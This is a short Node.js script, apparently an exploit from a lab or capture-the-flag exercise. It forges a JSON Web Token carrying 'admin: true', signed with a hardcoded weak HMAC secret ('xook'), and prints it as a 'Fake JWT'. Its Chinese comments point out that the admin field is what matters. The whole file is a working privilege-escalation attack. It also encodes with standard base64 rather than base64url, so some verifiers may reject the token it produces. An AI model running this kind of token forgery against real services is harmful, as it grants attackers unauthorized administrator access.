const crypto = require('crypto');

const jwtSecret = "xook";
const jwtHeader = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" }), "utf-8")
  .toString("base64")
  .replace(/=/g, "");

const payload = {
  name: "user",   // 这个名字随意，你可以用任意名字
  admin: true     // 关键是这个字段
};

const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
  .toString("base64")
  .replace(/=/g, "");

const signature = crypto.createHmac('sha256', jwtSecret)
  .update(jwtHeader + '.' + jwtPayload)
  .digest('base64')
  .replace(/=/g, '');

const fakeToken = jwtHeader + '.' + jwtPayload + '.' + signature;
console.log("Fake JWT:", fakeToken);
